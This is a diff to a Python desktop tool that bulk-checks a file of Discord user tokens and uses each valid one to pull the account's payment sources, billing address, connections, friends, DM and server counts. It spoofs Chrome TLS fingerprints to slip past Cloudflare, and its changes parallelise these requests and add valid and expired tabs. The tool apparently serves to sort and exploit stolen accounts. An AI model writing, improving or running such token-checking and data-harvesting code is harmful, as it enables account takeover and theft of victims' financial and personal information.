@@ -67,7 +67,8 @@ SEC_CH_UA_PLATFORM = '"Windows"'
 BUILD = 368827
 TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tokens.txt')
 TOKENS_DATA_OLD = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'token_data_old.txt')
-VERIFY_WORKERS = 8
+VERIFY_WORKERS = 20
+CARD_PAGE_SIZE = 50
 
 def _sprops():
     return base64.b64encode(json.dumps({
@@ -149,31 +150,33 @@ def _headers_no_ct(token):
 _stealth_sessions = {}
 _session_lock = threading.Lock()
 
+# Shared stealth session pool (reused across tokens — CF cookies are site-level, not per-token)
+_shared_sessions = []
+_shared_session_idx = 0
+_shared_pool_size = 6
+_shared_pool_ready = threading.Event()
+
+def _init_shared_sessions():
+    """Create a small pool of curl_cffi stealth sessions (background, once)."""
+    global _shared_sessions
+    for _ in range(_shared_pool_size):
+        s = creq.Session(impersonate='chrome')
+        _shared_sessions.append(s)
+    _shared_pool_ready.set()
+    print(f'[stealth] Initialized {_shared_pool_size} shared sessions')
+
+threading.Thread(target=_init_shared_sessions, daemon=True).start()
+
 def _get_stealth_session(token):
-    """Get or create a curl_cffi stealth session for a token (Chrome TLS fingerprint + cookies)."""
+    """Get a stealth session from the shared pool (round-robin, no per-token preload)."""
+    global _shared_session_idx
+    _shared_pool_ready.wait(timeout=10)
+    if not _shared_sessions:
+        return creq.Session(impersonate='chrome')
     with _session_lock:
-        if token in _stealth_sessions:
-            return _stealth_sessions[token]
-    s = creq.Session(impersonate='chrome')
-    # Visit Discord to get Cloudflare cookies
-    try:
-        s.get('https://discord.com/channels/@me', headers={
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'User-Agent': UA,
-            'Sec-CH-UA': SEC_CH_UA,
-            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
-            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Upgrade-Insecure-Requests': '1',
-        }, timeout=15)
-    except:
-        pass
-    with _session_lock:
-        _stealth_sessions[token] = s
-    return s
+        idx = _shared_session_idx % len(_shared_sessions)
+        _shared_session_idx += 1
+        return _shared_sessions[idx]
 
 def _stealth_get(token, url, timeout=10):
     """GET with Chrome TLS fingerprint + full Discord headers."""
@@ -1043,54 +1046,64 @@ class TokenInfo:
                     ts = ((int(self.user_id) >> 22) + 1420070400000) / 1000
                     self.created_at = datetime.fromtimestamp(ts, tz=timezone.utc)
 
-                # Guilds
-                try:
-                    gr = _stealth_get(self.token, f'{API}/users/@me/guilds?limit=200', timeout=8)
-                    if gr.status_code == 200:
-                        self.guilds_count = len(gr.json())
-                except: pass
+                # ── Supplementary data — all 5 calls run in PARALLEL ──
+                _tok = self.token
+                _self = self
 
-                # Billing / payment sources
-                try:
-                    br = _stealth_get(self.token, f'{API}/users/@me/billing/payment-sources', timeout=8)
-                    if br.status_code == 200:
-                        sources = br.json()
-                        if sources:
-                            self.has_billing = True
-                            src = sources[0]
-                            bt = src.get('type', 0)
-                            self.billing_type = {1: 'Credit Card', 2: 'PayPal', 3: 'Gift Card'}.get(bt, f'Type {bt}')
-                            ba = src.get('billing_address', {})
-                            if ba:
-                                parts = [ba.get('line_1', ''), ba.get('city', ''),
-                                         ba.get('state', ''), ba.get('postal_code', ''),
-                                         ba.get('country', '')]
-                                self.billing_address = ', '.join(p for p in parts if p)
-                                self.billing_country = ba.get('country', '')
-                except: pass
+                def _fetch_guilds():
+                    try:
+                        gr = _stealth_get(_tok, f'{API}/users/@me/guilds?limit=200', timeout=8)
+                        if gr.status_code == 200: _self.guilds_count = len(gr.json())
+                    except: pass
 
-                # Connections (Steam, Spotify, etc)
-                try:
-                    cr = _stealth_get(self.token, f'{API}/users/@me/connections', timeout=8)
-                    if cr.status_code == 200:
-                        self.connections = [{'type': c.get('type', ''), 'name': c.get('name', '')}
-                                           for c in cr.json()]
-                except: pass
+                def _fetch_billing():
+                    try:
+                        br = _stealth_get(_tok, f'{API}/users/@me/billing/payment-sources', timeout=8)
+                        if br.status_code == 200:
+                            sources = br.json()
+                            if sources:
+                                _self.has_billing = True
+                                src = sources[0]
+                                bt = src.get('type', 0)
+                                _self.billing_type = {1: 'Credit Card', 2: 'PayPal', 3: 'Gift Card'}.get(bt, f'Type {bt}')
+                                ba = src.get('billing_address', {})
+                                if ba:
+                                    parts = [ba.get('line_1', ''), ba.get('city', ''),
+                                             ba.get('state', ''), ba.get('postal_code', ''),
+                                             ba.get('country', '')]
+                                    _self.billing_address = ', '.join(p for p in parts if p)
+                                    _self.billing_country = ba.get('country', '')
+                    except: pass
 
-                # Friend count
-                try:
-                    fr = _stealth_get(self.token, f'{API}/users/@me/relationships', timeout=8)
-                    if fr.status_code == 200:
-                        rels = fr.json()
-                        self.friend_count = sum(1 for r in rels if r.get('type') == 1)
-                except: pass
+                def _fetch_connections():
+                    try:
+                        cr = _stealth_get(_tok, f'{API}/users/@me/connections', timeout=8)
+                        if cr.status_code == 200:
+                            _self.connections = [{'type': c.get('type', ''), 'name': c.get('name', '')}
+                                                for c in cr.json()]
+                    except: pass
 
-                # DM channels count
-                try:
-                    dr = _stealth_get(self.token, f'{API}/users/@me/channels', timeout=8)
-                    if dr.status_code == 200:
-                        self.dm_count = len(dr.json())
-                except: pass
+                def _fetch_friends():
+                    try:
+                        fr = _stealth_get(_tok, f'{API}/users/@me/relationships', timeout=8)
+                        if fr.status_code == 200:
+                            rels = fr.json()
+                            _self.friend_count = sum(1 for r in rels if r.get('type') == 1)
+                    except: pass
+
+                def _fetch_dms():
+                    try:
+                        dr = _stealth_get(_tok, f'{API}/users/@me/channels', timeout=8)
+                        if dr.status_code == 200: _self.dm_count = len(dr.json())
+                    except: pass
+
+                subs = []
+                for fn in (_fetch_guilds, _fetch_billing, _fetch_connections, _fetch_friends, _fetch_dms):
+                    th = threading.Thread(target=fn, daemon=True)
+                    th.start()
+                    subs.append(th)
+                for th in subs:
+                    th.join(timeout=12)
 
             else:
                 self.valid = False
@@ -3198,8 +3211,15 @@ class DataHub(ctk.CTk):
         self._cards_pending = False
         self._card_token_hash = None     # hash of displayed tokens for dirty-checking
 
+        # Pagination state
+        self._sorted_display = []
+        self._display_offset = 0
+        self._load_more_frame = None
+
         # Scan limiter — max 3 concurrent seed scanners
         self._scan_pool = ThreadPoolExecutor(max_workers=3)
+        # Avatar download pool — bounded to avoid thread explosion
+        self._avatar_pool = ThreadPoolExecutor(max_workers=8)
 
         # Panel tracking — key -> panel instance (persistent)
         self._panels: dict[str, ActionPanel] = {}
@@ -3274,30 +3294,21 @@ class DataHub(ctk.CTk):
         self._stat_sep(si)
         self.stat_check   = self._make_stat(si, "...", "STATUS",    C['yellow'])
 
-        # ── Config bar (self-token + channel ID) ──
-        cfg_bar = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=46)
-        cfg_bar.pack(fill="x"); cfg_bar.pack_propagate(False)
-        cfg_inner = ctk.CTkFrame(cfg_bar, fg_color="transparent"); cfg_inner.pack(side="left", padx=16, pady=6, fill="x", expand=True)
-        ctk.CTkLabel(cfg_inner, text="Self Token:", font=_F(FONT, 11, "bold"),
-                     text_color=C['text_muted']).pack(side="left", padx=(0, 6))
-        self._self_token_var = ctk.StringVar(value=USER_TOKEN)
-        self._self_token_entry = ctk.CTkEntry(cfg_inner, textvariable=self._self_token_var,
-                                               placeholder_text="Paste your Discord token here...",
-                                               width=420, height=30, corner_radius=7, show="*",
-                                               fg_color=C['surface_2'], border_color=C['border'],
-                                               text_color=C['text'], font=_F(MONO, 11))
-        self._self_token_entry.pack(side="left", padx=(0, 12))
-        ctk.CTkLabel(cfg_inner, text="Channel ID:", font=_F(FONT, 11, "bold"),
-                     text_color=C['text_muted']).pack(side="left", padx=(0, 6))
-        self._channel_id_var = ctk.StringVar(value=CHANNEL_ID)
-        ctk.CTkEntry(cfg_inner, textvariable=self._channel_id_var, width=180, height=30, corner_radius=7,
-                     fg_color=C['surface_2'], border_color=C['border'],
-                     text_color=C['text'], font=_F(MONO, 11)).pack(side="left", padx=(0, 12))
-        ctk.CTkButton(cfg_inner, text="💾 Save", width=70, height=30, corner_radius=7,
-                      fg_color=C['accent'], hover_color=C['accent_hover'],
-                      font=_F(FONT, 11, "bold"), command=self._save_config).pack(side="left")
-        self._cfg_status = ctk.CTkLabel(cfg_inner, text="", font=_F(FONT, 11), text_color=C['green'])
-        self._cfg_status.pack(side="left", padx=8)
+        # ── Tab bar (Valid / Expired) ──
+        self._current_tab = 'valid'
+        tab_bar = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=46)
+        tab_bar.pack(fill="x"); tab_bar.pack_propagate(False)
+        tab_inner = ctk.CTkFrame(tab_bar, fg_color="transparent"); tab_inner.pack(side="left", padx=16, pady=6, fill="x", expand=True)
+        self._tab_valid_btn = ctk.CTkButton(tab_inner, text="✅  Valid Tokens", width=160, height=32, corner_radius=8,
+                                             fg_color=C['green'], hover_color=C['green_dim'],
+                                             font=_F(FONT, 13, "bold"), command=lambda: self._switch_tab('valid'))
+        self._tab_valid_btn.pack(side="left", padx=(0, 8))
+        self._tab_expired_btn = ctk.CTkButton(tab_inner, text="❌  Expired Tokens", width=160, height=32, corner_radius=8,
+                                               fg_color=C['surface_2'], hover_color=C['card_hover'],
+                                               font=_F(FONT, 13, "bold"), command=lambda: self._switch_tab('expired'))
+        self._tab_expired_btn.pack(side="left", padx=(0, 8))
+        self._tab_count_lbl = ctk.CTkLabel(tab_inner, text="", font=_F(FONT, 11), text_color=C['text_muted'])
+        self._tab_count_lbl.pack(side="left", padx=16)
 
         # ── Token List ──
         self.scroll = ctk.CTkScrollableFrame(self, fg_color=C['bg'], corner_radius=0,
@@ -3368,15 +3379,18 @@ class DataHub(ctk.CTk):
     def _stat_sep(self, parent):
         ctk.CTkFrame(parent, fg_color=C['border'], width=1, height=40).pack(side="left", padx=2)
 
-    def _save_config(self):
-        global USER_TOKEN, CHANNEL_ID
-        tok = self._self_token_var.get().strip()
-        ch  = self._channel_id_var.get().strip()
-        USER_TOKEN = tok
-        CHANNEL_ID = ch or CHANNEL_ID
-        _save_cfg({'user_token': tok, 'channel_id': CHANNEL_ID, 'guild_id': GUILD_ID})
-        self._cfg_status.configure(text="✓ Saved")
-        self.after(2000, lambda: self._cfg_status.configure(text=""))
+    def _switch_tab(self, tab):
+        if tab == self._current_tab:
+            return
+        self._current_tab = tab
+        if tab == 'valid':
+            self._tab_valid_btn.configure(fg_color=C['green'], hover_color=C['green_dim'])
+            self._tab_expired_btn.configure(fg_color=C['surface_2'], hover_color=C['card_hover'])
+        else:
+            self._tab_valid_btn.configure(fg_color=C['surface_2'], hover_color=C['card_hover'])
+            self._tab_expired_btn.configure(fg_color=C['red'], hover_color=C['red_dim'])
+        self._card_token_hash = None  # Force full rebuild
+        self._safe_update_ui()
 
     # ━━━ Panel management — persistent with green highlight ━━━
     def _toggle_panel(self, key):
@@ -3467,6 +3481,13 @@ class DataHub(ctk.CTk):
             self.stat_friends.configure(text=str(avg_f))
             self.stat_expired.configure(text=str(len(self.expired_tokens)))
             self.stat_recovered.configure(text=str(self.recovered_count))
+            # Update tab counts
+            try:
+                valid_count = len(valid)
+                expired_count = len(self.expired_tokens)
+                self._tab_valid_btn.configure(text=f"✅  Valid Tokens ({valid_count})")
+                self._tab_expired_btn.configure(text=f"❌  Expired Tokens ({expired_count})")
+            except: pass
             if unchecked > 0:
                 self.stat_check.configure(text=f"{unchecked} left", text_color=C['yellow'])
             else:
@@ -3474,11 +3495,10 @@ class DataHub(ctk.CTk):
         except: pass
 
     def _rebuild_cards(self):
-        """Destroy and recreate token cards — skips if token data hasn't changed."""
+        """Destroy and recreate token cards — paginated for speed."""
         if self._destroyed: return
         try:
             sorted_tokens = self._sorted_tokens()
-            # Hash on identity + key display data to detect real changes
             data = tuple(
                 (t.token[:20], t.valid, t.has_billing, t.nitro, t.username or '', t.badges)
                 for t in sorted_tokens
@@ -3492,11 +3512,42 @@ class DataHub(ctk.CTk):
                 try: w.destroy()
                 except: pass
 
-            for t in sorted_tokens:
-                try: self._add_token_card(t)
-                except Exception as e: print(f'[ui] Card error: {e}')
+            self._sorted_display = sorted_tokens
+            self._display_offset = 0
+            self._load_more_frame = None
+            self._load_next_page()
         except Exception as e:
             print(f'[ui] Rebuild error: {e}')
+
+    def _load_next_page(self):
+        """Render the next batch of token cards (paginated)."""
+        if self._destroyed: return
+        batch = self._sorted_display[self._display_offset:self._display_offset + CARD_PAGE_SIZE]
+        if not batch: return
+
+        # Remove existing Load More button
+        if self._load_more_frame:
+            try: self._load_more_frame.destroy()
+            except: pass
+            self._load_more_frame = None
+
+        for t in batch:
+            try: self._add_token_card(t)
+            except Exception as e: print(f'[ui] Card error: {e}')
+
+        self._display_offset += CARD_PAGE_SIZE
+        remaining = len(self._sorted_display) - self._display_offset
+        if remaining > 0:
+            self._load_more_frame = ctk.CTkFrame(self.scroll, fg_color='transparent')
+            self._load_more_frame.pack(fill='x', padx=2, pady=8)
+            ctk.CTkButton(
+                self._load_more_frame,
+                text=f'\u25bc  Load More  ({remaining} remaining)',
+                width=300, height=36, corner_radius=10,
+                fg_color=C['surface_2'], hover_color=C['card_hover'],
+                font=_F(FONT, 12, 'bold'), text_color=C['text_2'],
+                command=self._load_next_page
+            ).pack(pady=4)
 
     # ━━━ Data fetching ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     def _start_fetch(self):
@@ -3566,6 +3617,7 @@ class DataHub(ctk.CTk):
         if not snapshot: return
         done_count = [0]
         total = len(snapshot)
+        first_batch_shown = [False]
 
         def _check_one(t):
             try: t.check_validity()
@@ -3578,16 +3630,22 @@ class DataHub(ctk.CTk):
             for future in as_completed(futures):
                 try: future.result()
                 except: pass
-                if done_count[0] % 4 == 0 or done_count[0] == total:
-                    self._safe_update_stats()   # Stats ONLY during verification — no card rebuild
+                n = done_count[0]
+                if n % 4 == 0 or n == total:
+                    self._safe_update_stats()
+                # Show first batch of cards as soon as enough are ready
+                if not first_batch_shown[0] and n >= min(CARD_PAGE_SIZE, total):
+                    first_batch_shown[0] = True
+                    self._safe_update_ui()
 
         with self._lock:
             expired = [t for t in self.tokens if t.valid is False]
             save_expired_tokens(expired)
-            # Keep expired tokens in memory for recovery panel
+            # Move expired tokens to the expired list (keeps their data intact)
             for t in expired:
                 if not any(e.user_id == t.user_id and t.user_id for e in self.expired_tokens):
                     self.expired_tokens.append(t)
+            # Remove from main list (they live in expired_tokens now)
             self.tokens = [t for t in self.tokens if t.valid is not False]
             self._dedup_by_user()
 
@@ -3753,7 +3811,11 @@ class DataHub(ctk.CTk):
 
     def _sorted_tokens(self):
         sort = self.sort_var.get()
-        with self._lock: tokens = list(self.tokens)
+        with self._lock:
+            if self._current_tab == 'valid':
+                tokens = [t for t in self.tokens if t.valid is not False]
+            else:
+                tokens = list(self.expired_tokens)
         if sort == "⭐ Important":
             tokens.sort(key=lambda t: (-t.importance_score, t.username or ''))
         elif sort == "Nitro First":
@@ -3915,7 +3977,7 @@ class DataHub(ctk.CTk):
                      text_color="#fff", height=18).pack(padx=2)
 
     def _load_avatar_async(self, url, frame):
-        """Load avatar into frame — cached refs, non-blocking."""
+        """Load avatar into frame — cached refs, uses shared pool."""
         cache_key = url or '_default_'
         cached = self._avatar_refs.get(cache_key)
         if cached:
@@ -3941,7 +4003,7 @@ class DataHub(ctk.CTk):
                     except: pass
                 self.after(0, _place)
             except: pass
-        threading.Thread(target=_bg, daemon=True).start()
+        self._avatar_pool.submit(_bg)
 
     # ━━━ Info popup ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     def _show_full_info(self, t: TokenInfo):
@@ -4228,6 +4290,8 @@ class DataHub(ctk.CTk):
         self._destroyed = True
         self.auto_check_running = False
         try: self._scan_pool.shutdown(wait=False)
+        except: pass
+        try: self._avatar_pool.shutdown(wait=False)
         except: pass
         for key, panel in list(self._panels.items()):
             try: panel.force_destroy()
